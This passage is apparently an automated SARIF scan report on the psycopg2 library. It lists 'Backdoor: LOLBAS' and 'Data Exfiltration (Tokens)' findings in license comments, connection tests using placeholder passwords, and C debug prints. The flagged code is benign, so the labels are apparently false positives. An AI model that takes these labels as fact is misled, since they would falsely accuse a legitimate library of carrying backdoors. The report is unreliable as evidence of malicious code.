                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/__init__.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 341,
                  "startColumn": 7,
                  "endLine": 341,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        pkgdir = os.path.dirname(psycopg2.__file__)\n        pardir = os.path.dirname(pkgdir)\n        self.assert_(pardir in sys.path)\n        script = f\"\"\"\nimport sys\nsys.path.remove({pardir!r})\nsys.path.insert(0, {pkgdir!r})\n",
                    "rendered": {
                      "text": "        pkgdir = os.path.dirname(psycopg2.__file__)\n        pardir = os.path.dirname(pkgdir)\n        self.assert_(pardir in sys.path)\n        script = f\"\"\"\nimport sys\nsys.path.remove({pardir!r})\nsys.path.insert(0, {pkgdir!r})\n",
                      "markdown": "`        pkgdir = os.path.dirname(psycopg2.__file__)\n        pardir = os.path.dirname(pkgdir)\n        self.assert_(pardir in sys.path)\n        script = f\"\"\"\nimport sys\nsys.path.remove({pardir!r})\nsys.path.insert(0, {pkgdir!r})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 55,
                  "endLine": 139,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\n    def test_empty_param(self):\n        psycopg2.connect(database='sony', password='')\n        self.assertDsnEqual(self.args[0], \"dbname=sony password=''\")\n\n    def test_escape(self):\n        psycopg2.connect(database='hello world')\n",
                    "rendered": {
                      "text": "\n    def test_empty_param(self):\n        psycopg2.connect(database='sony', password='')\n        self.assertDsnEqual(self.args[0], \"dbname=sony password=''\")\n\n    def test_escape(self):\n        psycopg2.connect(database='hello world')\n",
                      "markdown": "`\n    def test_empty_param(self):\n        psycopg2.connect(database='sony', password='')\n        self.assertDsnEqual(self.args[0], \"dbname=sony password=''\")\n\n    def test_escape(self):\n        psycopg2.connect(database='hello world')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 42,
                  "endLine": 138,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        self.assert_(\" port=6543 \" in dsn, dsn)\n\n    def test_empty_param(self):\n        psycopg2.connect(database='sony', password='')\n        self.assertDsnEqual(self.args[0], \"dbname=sony password=''\")\n\n    def test_escape(self):\n",
                    "rendered": {
                      "text": "        self.assert_(\" port=6543 \" in dsn, dsn)\n\n    def test_empty_param(self):\n        psycopg2.connect(database='sony', password='')\n        self.assertDsnEqual(self.args[0], \"dbname=sony password=''\")\n\n    def test_escape(self):\n",
                      "markdown": "`        self.assert_(\" port=6543 \" in dsn, dsn)\n\n    def test_empty_param(self):\n        psycopg2.connect(database='sony', password='')\n        self.assertDsnEqual(self.args[0], \"dbname=sony password=''\")\n\n    def test_escape(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 22,
                  "endLine": 98,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            user='postgres', password='secret', port=5432)\n        self.assert_('dbname=foo' in self.args[0])\n        self.assert_('user=postgres' in self.args[0])\n        self.assert_('password=secret' in self.args[0])\n        self.assert_('port=5432' in self.args[0])\n        self.assertEqual(len(self.args[0].split()), 4)\n\n",
                    "rendered": {
                      "text": "            user='postgres', password='secret', port=5432)\n        self.assert_('dbname=foo' in self.args[0])\n        self.assert_('user=postgres' in self.args[0])\n        self.assert_('password=secret' in self.args[0])\n        self.assert_('port=5432' in self.args[0])\n        self.assertEqual(len(self.args[0].split()), 4)\n\n",
                      "markdown": "`            user='postgres', password='secret', port=5432)\n        self.assert_('dbname=foo' in self.args[0])\n        self.assert_('user=postgres' in self.args[0])\n        self.assert_('password=secret' in self.args[0])\n        self.assert_('port=5432' in self.args[0])\n        self.assertEqual(len(self.args[0].split()), 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 29,
                  "endLine": 95,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        self.assertEqual(self.args[0], 'sslmode=require')\n\n        psycopg2.connect(database='foo',\n            user='postgres', password='secret', port=5432)\n        self.assert_('dbname=foo' in self.args[0])\n        self.assert_('user=postgres' in self.args[0])\n        self.assert_('password=secret' in self.args[0])\n",
                    "rendered": {
                      "text": "        self.assertEqual(self.args[0], 'sslmode=require')\n\n        psycopg2.connect(database='foo',\n            user='postgres', password='secret', port=5432)\n        self.assert_('dbname=foo' in self.args[0])\n        self.assert_('user=postgres' in self.args[0])\n        self.assert_('password=secret' in self.args[0])\n",
                      "markdown": "`        self.assertEqual(self.args[0], 'sslmode=require')\n\n        psycopg2.connect(database='foo',\n            user='postgres', password='secret', port=5432)\n        self.assert_('dbname=foo' in self.args[0])\n        self.assert_('user=postgres' in self.args[0])\n        self.assert_('password=secret' in self.args[0])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 88,
                  "startColumn": 40,
                  "endLine": 88,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        psycopg2.connect(user='postgres')\n        self.assertEqual(self.args[0], 'user=postgres')\n        psycopg2.connect(password='secret')\n        self.assertEqual(self.args[0], 'password=secret')\n        psycopg2.connect(port=5432)\n        self.assertEqual(self.args[0], 'port=5432')\n        psycopg2.connect(sslmode='require')\n",
                    "rendered": {
                      "text": "        psycopg2.connect(user='postgres')\n        self.assertEqual(self.args[0], 'user=postgres')\n        psycopg2.connect(password='secret')\n        self.assertEqual(self.args[0], 'password=secret')\n        psycopg2.connect(port=5432)\n        self.assertEqual(self.args[0], 'port=5432')\n        psycopg2.connect(sslmode='require')\n",
                      "markdown": "`        psycopg2.connect(user='postgres')\n        self.assertEqual(self.args[0], 'user=postgres')\n        psycopg2.connect(password='secret')\n        self.assertEqual(self.args[0], 'password=secret')\n        psycopg2.connect(port=5432)\n        self.assertEqual(self.args[0], 'port=5432')\n        psycopg2.connect(sslmode='require')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_module.py"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 25,
                  "endLine": 87,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        self.assertEqual(self.args[0], 'dbname=foo')\n        psycopg2.connect(user='postgres')\n        self.assertEqual(self.args[0], 'user=postgres')\n        psycopg2.connect(password='secret')\n        self.assertEqual(self.args[0], 'password=secret')\n        psycopg2.connect(port=5432)\n        self.assertEqual(self.args[0], 'port=5432')\n",
                    "rendered": {
                      "text": "        self.assertEqual(self.args[0], 'dbname=foo')\n        psycopg2.connect(user='postgres')\n        self.assertEqual(self.args[0], 'user=postgres')\n        psycopg2.connect(password='secret')\n        self.assertEqual(self.args[0], 'password=secret')\n        psycopg2.connect(port=5432)\n        self.assertEqual(self.args[0], 'port=5432')\n",
                      "markdown": "`        self.assertEqual(self.args[0], 'dbname=foo')\n        psycopg2.connect(user='postgres')\n        self.assertEqual(self.args[0], 'user=postgres')\n        psycopg2.connect(password='secret')\n        self.assertEqual(self.args[0], 'password=secret')\n        psycopg2.connect(port=5432)\n        self.assertEqual(self.args[0], 'port=5432')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pboolean.c"
                },
                "region": {
                  "startLine": 116,
                  "startColumn": 54,
                  "endLine": 116,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pboolean_dealloc: deleted pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pboolean_dealloc: deleted pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pboolean_dealloc: deleted pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pboolean.c"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 49,
                  "endLine": 102,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pboolean_setup: good pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pboolean_setup: good pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pboolean_setup: good pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pboolean.c"
                },
                "region": {
                  "startLine": 94,
                  "startColumn": 49,
                  "endLine": 94,
                  "endColumn": 53,
                  "snippet": {
                    "text": "static int\npboolean_setup(pbooleanObject *self, PyObject *obj)\n{\n    Dprintf(\"pboolean_setup: init pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\npboolean_setup(pbooleanObject *self, PyObject *obj)\n{\n    Dprintf(\"pboolean_setup: init pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\npboolean_setup(pbooleanObject *self, PyObject *obj)\n{\n    Dprintf(\"pboolean_setup: init pboolean object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/replication_cursor_type.c"
                },
                "region": {
                  "startLine": 349,
                  "startColumn": 34,
                  "endLine": 349,
                  "endColumn": 38,
                  "snippet": {
                    "text": "replicationCursor_repr(replicationCursorObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationCursor object at %p; closed: %d>\", self, self->cur.closed);\n}\n\nstatic int\n",
                    "rendered": {
                      "text": "replicationCursor_repr(replicationCursorObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationCursor object at %p; closed: %d>\", self, self->cur.closed);\n}\n\nstatic int\n",
                      "markdown": "`replicationCursor_repr(replicationCursorObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationCursor object at %p; closed: %d>\", self, self->cur.closed);\n}\n\nstatic int\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/replication_cursor_type.c"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 82,
                  "endLine": 197,
                  "endColumn": 90,
                  "snippet": {
                    "text": "}\n\n#define send_feedback_doc \\\n\"send_feedback(write_lsn=0, flush_lsn=0, apply_lsn=0, reply=False, force=False) -- Update a replication feedback, optionally request a reply or force sending a feedback message regardless of the timeout.\"\n\nstatic PyObject *\nsend_feedback(replicationCursorObject *self,\n",
                    "rendered": {
                      "text": "}\n\n#define send_feedback_doc \\\n\"send_feedback(write_lsn=0, flush_lsn=0, apply_lsn=0, reply=False, force=False) -- Update a replication feedback, optionally request a reply or force sending a feedback message regardless of the timeout.\"\n\nstatic PyObject *\nsend_feedback(replicationCursorObject *self,\n",
                      "markdown": "`}\n\n#define send_feedback_doc \\\n\"send_feedback(write_lsn=0, flush_lsn=0, apply_lsn=0, reply=False, force=False) -- Update a replication feedback, optionally request a reply or force sending a feedback message regardless of the timeout.\"\n\nstatic PyObject *\nsend_feedback(replicationCursorObject *self,\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 28,
                  "endLine": 107,
                  "endColumn": 32,
                  "snippet": {
                    "text": "static const char host_doc[] =\n\"The server host name of the connection.\\n\"\n\"\\n\"\n\"This can be a host name, an IP address, or a directory path if the\\n\"\n\"connection is via Unix socket. (The path case can be distinguished\\n\"\n\"because it will always be an absolute path, beginning with ``/``.)\\n\"\n\"\\n\"\n",
                    "rendered": {
                      "text": "static const char host_doc[] =\n\"The server host name of the connection.\\n\"\n\"\\n\"\n\"This can be a host name, an IP address, or a directory path if the\\n\"\n\"connection is via Unix socket. (The path case can be distinguished\\n\"\n\"because it will always be an absolute path, beginning with ``/``.)\\n\"\n\"\\n\"\n",
                      "markdown": "`static const char host_doc[] =\n\"The server host name of the connection.\\n\"\n\"\\n\"\n\"This can be a host name, an IP address, or a directory path if the\\n\"\n\"connection is via Unix socket. (The path case can be distinguished\\n\"\n\"because it will always be an absolute path, beginning with ``/``.)\\n\"\n\"\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 557,
                  "startColumn": 22,
                  "endLine": 557,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n    { \"ssl_attribute_names\", (getter)ssl_attribute_names_get, NULL,\n",
                    "rendered": {
                      "text": "    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n    { \"ssl_attribute_names\", (getter)ssl_attribute_names_get, NULL,\n",
                      "markdown": "`    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n    { \"ssl_attribute_names\", (getter)ssl_attribute_names_get, NULL,\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 38,
                  "endLine": 556,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n",
                    "rendered": {
                      "text": "    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n",
                      "markdown": "`    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 13,
                  "endLine": 556,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n",
                    "rendered": {
                      "text": "    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n",
                      "markdown": "`    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n        (char *)ssl_in_use_doc },\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 555,
                  "startColumn": 21,
                  "endLine": 555,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n",
                    "rendered": {
                      "text": "    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n",
                      "markdown": "`    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n    { \"ssl_in_use\", (getter)ssl_in_use_get, NULL,\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 554,
                  "startColumn": 36,
                  "endLine": 554,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        (char *)error_message_doc },\n    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n",
